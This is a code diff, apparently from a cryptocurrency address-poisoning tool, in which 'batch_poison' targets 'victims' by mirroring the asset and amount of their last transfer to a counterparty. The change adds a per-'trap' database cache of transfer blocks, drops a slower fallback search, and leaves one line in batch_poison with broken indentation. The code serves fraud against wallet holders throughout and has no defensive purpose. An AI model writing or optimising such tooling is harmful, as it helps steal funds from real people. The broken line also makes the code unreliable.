@@ -697,16 +697,15 @@ def get_counterparty_from_db(victim_address, campaign_id):
         logger.error(f"Failed to fetch counterparty for victim {victim_address}: {e}")
         return None
 
-def fetch_last_transfer_from_blockchain(victim_address, counterparty_address):
+def fetch_last_transfer_from_blockchain(victim_address, counterparty_address, trap_id=None):
     """
-    Fetch the most recent transfer from victim to counterparty.
+    Fetch the most recent transfer with database caching.
     
     Strategy:
-    1. Try all Alchemy RPCs (with failover for rate limits/errors)
-    2. If ANY Alchemy succeeds but finds nothing, that's definitive - skip slow fallback
-    3. Only use slow fallback if ALL Alchemy URLs failed with errors
-    
-    Returns (asset_symbol, amount_in_smallest_units) or (None, None).
+    1. Check database cache first
+    2. If cache exists, only query from cached block to latest
+    3. Update cache after successful query
+    4. Fall back to full history only on first run
     """
     try:
         victim_checksum = w3.to_checksum_address(victim_address)
@@ -714,40 +713,50 @@ def fetch_last_transfer_from_blockchain(victim_address, counterparty_address):
         victim_lower = victim_address.lower()
         counterparty_lower = counterparty_address.lower()
         
-        # ═══════════════════════════════════════════════════════
-        # METHOD 1: Try all Alchemy RPCs with failover
-        # ═══════════════════════════════════════════════════════
-        alchemy_urls = ALCHEMY_RPCS.get(CHAIN.lower(), [])
-        alchemy_success_but_no_result = False
+        # Check database cache
+        from_block = '0x0'  # Default to full history
+        cached_asset = None
+        cached_amount = None
         
-        alchemy_errors = []  # Track all errors for logging
+        if trap_id and supabase:
+            result = supabase.table('traps').select(
+                'last_transfer_block, last_transfer_asset, last_transfer_amount'
+            ).eq('id', trap_id).single().execute()
+            
+            if result.data and result.data.get('last_transfer_block'):
+                cached_block = result.data['last_transfer_block']
+                cached_asset = result.data['last_transfer_asset']
+                cached_amount = result.data['last_transfer_amount']
+                
+                # Only query from cached block to latest (much faster)
+                from_block = hex(cached_block + 1)  # Start from block after last cached
+                logger.info(f"[Cache] Found cached transfer at block {cached_block}, querying from {from_block}")
+        
+        # Try Alchemy APIs (with rate limit handling from previous fix)
+        alchemy_urls = ALCHEMY_RPCS.get(CHAIN.lower(), [])
+        alchemy_errors = []
         
         for url_idx, url in enumerate(alchemy_urls):
             try:
-                # Create a temporary Web3 instance for this specific Alchemy URL
                 alchemy_w3 = Web3(Web3.HTTPProvider(url, request_kwargs={'timeout': 10}))
                 if not alchemy_w3.is_connected():
-                    error_msg = f"Connection failed"
-                    logger.warning(f"[Alchemy:{url[:30]}...] {error_msg}")
-                    alchemy_errors.append((url[:30], error_msg))
                     continue
-
+                
                 categories = ['external', 'erc20']
                 if CHAIN.lower() in ('ethereum', 'polygon'):
                     categories.append('internal')
                 
                 result = alchemy_w3.provider.make_request('alchemy_getAssetTransfers', [{
-                    'fromBlock': '0x0',
+                    'fromBlock': from_block,
                     'toBlock': 'latest',
                     'fromAddress': victim_checksum,
                     'toAddress': counterparty_checksum,
                     'category': categories,
                     'order': 'desc',
                     'maxCount': '0x5',
-                    'withMetadata': False,
+                    'withMetadata': True,  # Include block metadata for caching
                 }])
                 
-                # Alchemy call succeeded - check results
                 if 'result' in result and result['result'].get('transfers'):
                     transfers = result['result']['transfers']
                     
@@ -755,10 +764,13 @@ def fetch_last_transfer_from_blockchain(victim_address, counterparty_address):
                         if (t.get('from', '').lower() == victim_lower and 
                             t.get('to', '').lower() == counterparty_lower):
                             
+                            # Extract block number for caching
+                            block_hex = t.get('blockNum', '0x0')
+                            block_num = int(block_hex, 16)
+                            
                             # Native transfer
                             if t.get('category') == 'external':
                                 value_raw = t.get('value', 0)
-
                                 if isinstance(value_raw, str):
                                     try:
                                         value_float = float(value_raw)
@@ -772,7 +784,11 @@ def fetch_last_transfer_from_blockchain(victim_address, counterparty_address):
                                     value_wei = int(float(value_raw) * (10 ** 18))
                                 
                                 if value_wei > 0:
-                                    logger.info(f"[Alchemy:{url[:30]}...] Found {NATIVE_SYMBOL} transfer: {w3.from_wei(value_wei, 'ether')} ETH")
+                                    logger.info(f"[Alchemy] Found {NATIVE_SYMBOL} transfer: {w3.from_wei(value_wei, 'ether')} ETH at block {block_num}")
+                                    
+                                    # Update cache
+                                    update_transfer_cache(trap_id, block_num, NATIVE_SYMBOL, str(value_wei))
+                                    
                                     return (NATIVE_SYMBOL, value_wei)
                             
                             # ERC-20 transfer
@@ -795,90 +811,65 @@ def fetch_last_transfer_from_blockchain(victim_address, counterparty_address):
                                     token_contract = raw_contract.get('address', '').lower()
                                     for symbol, addr in TOKEN_CONFIG.items():
                                         if addr.lower() == token_contract:
-                                            logger.info(f"[Alchemy:{url[:30]}...] Found {symbol} transfer: {value_units} units")
+                                            logger.info(f"[Alchemy] Found {symbol} transfer: {value_units} units at block {block_num}")
+                                            
+                                            # Update cache
+                                            update_transfer_cache(trap_id, block_num, symbol, str(value_units))
+                                            
                                             return (symbol, value_units)
                 
-                # Alchemy succeeded but found no matching transfers
-                # This is definitive - don't try slow fallback
-                logger.info(f"[Alchemy:{url[:30]}...] Search successful, no transfers found")
-                alchemy_success_but_no_result = True
-                break  # No need to try other Alchemy URLs
+                # No new transfers found since cached block
+                if cached_asset and cached_amount:
+                    logger.info(f"[Cache] No new transfers since block {cached_block}, using cached: {cached_amount} {cached_asset}")
+                    return (cached_asset, int(cached_amount))
+                
+                # First run - no cache and no transfers found
+                logger.info(f"[Alchemy] No transfers found in history")
+                return (None, None)
                 
             except Exception as e:
                 err_str = str(e)
-                err_lower = err_str.lower()
-                
-                # Log ALL errors at INFO level so they're visible
                 logger.warning(f"[Alchemy:{url[:30]}...] Failed: {err_str[:200]}")
                 alchemy_errors.append((url[:30], err_str[:100]))
                 
-                # If it's a rate limit error, wait before trying next URL
+                # Rate limit handling
+                err_lower = err_str.lower()
                 if '429' in err_lower or 'rate limit' in err_lower or 'too many requests' in err_lower:
-                    if url_idx < len(alchemy_urls) - 1:  # Not the last URL
+                    if url_idx < len(alchemy_urls) - 1:
                         logger.info(f"[Alchemy] Rate limited, waiting 2s before next URL...")
                         time.sleep(2)
                 continue
         
-        # If Alchemy succeeded but found nothing, return None (don't try slow fallback)
-        if alchemy_success_but_no_result:
-            logger.info(f"[Alchemy] No victim→counterparty transfers found in history")
-            return (None, None)
+        # All Alchemy URLs failed
+        if cached_asset and cached_amount:
+            # Use cached data if available
+            logger.warning(f"[Cache] Alchemy failed, using cached: {cached_amount} {cached_asset}")
+            return (cached_asset, int(cached_amount))
         
-        # ═══════════════════════════════════════════════════════
-        # METHOD 2: Fallback to Free RPCs (only if ALL Alchemy URLs failed)
-        # ═══════════════════════════════════════════════════════
-        logger.warning(f"[Fallback] All Alchemy URLs failed, using slow chunked search...")
-        
-        current_block = call_with_retry(w3.eth.get_block_number)
-        chunk_size = 10000
-        max_search_blocks = 2000000 
-        
-        logger.info(f"[Fallback] Searching backwards from block {current_block} in {chunk_size}-block chunks...")
-        
-        transfer_topic = w3.keccak(text="Transfer(address,address,uint256)").hex()
-        victim_topic = '0x' + victim_lower[2:].zfill(64)
-        counterparty_topic = '0x' + counterparty_lower[2:].zfill(64)
-        
-        search_block = current_block
-        blocks_searched = 0
-        
-        while blocks_searched < max_search_blocks and search_block > 0:
-            from_block = max(0, search_block - chunk_size + 1)
-            
-            try:
-                for token_symbol, token_address in TOKEN_CONFIG.items():
-                    try:
-                        logs = w3.eth.get_logs({
-                            'fromBlock': from_block,
-                            'toBlock': search_block,
-                            'address': w3.to_checksum_address(token_address),
-                            'topics': [transfer_topic, victim_topic, counterparty_topic],
-                        })
-                        
-                        if logs:
-                            latest_log = logs[-1]
-                            value = int(latest_log['data'], 16)
-                            if value > 0:
-                                logger.info(f"[Fallback] Found {token_symbol} transfer at block {latest_log['blockNumber']}: {value} units")
-                                return (token_symbol, value)
-                    except Exception:
-                        continue
-                        
-            except Exception as e:
-                logger.debug(f"[Fallback] Error scanning blocks {from_block}-{search_block}: {e}")
-            
-            blocks_searched += chunk_size
-            search_block = from_block - 1
-            
-            if blocks_searched % 100000 == 0:
-                logger.info(f"[Fallback] Searched {blocks_searched} blocks so far...")
-        
-        logger.warning(f"[Fallback] No victim→counterparty transfers found after searching {blocks_searched} blocks")
+        # No cache and all APIs failed - skip this victim
+        logger.error(f"[SKIP] All Alchemy URLs failed and no cache available for {victim_address}")
         return (None, None)
         
     except Exception as e:
         logger.error(f"[RPC] Error fetching last transfer: {e}")
         return (None, None)
+
+
+def update_transfer_cache(trap_id, block_num, asset, amount):
+    """Update the transfer cache in the database."""
+    if not trap_id or not supabase:
+        return
+    
+    try:
+        supabase.table('traps').update({
+            'last_transfer_block': block_num,
+            'last_transfer_asset': asset,
+            'last_transfer_amount': amount,
+            'last_transfer_timestamp': datetime.now(timezone.utc).isoformat()
+        }).eq('id', trap_id).execute()
+        logger.debug(f"[Cache] Updated cache for trap {trap_id}: block {block_num}, {amount} {asset}")
+    except Exception as e:
+        logger.warning(f"[Cache] Failed to update cache for trap {trap_id}: {e}")
 
 
 def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
@@ -968,9 +959,9 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
             continue
         
-        # Fetch last transfer from blockchain
-        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty}...")
-        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty)
+                # Fetch last transfer from blockchain (with caching)
+        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty} (trap_id: {trap_id})...")
+        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty, trap_id)
         
         if not fetched_asset or not fetched_amount:
             logger.warning(f"[{i}/{total}] No transfer found for {victim}, skipping")
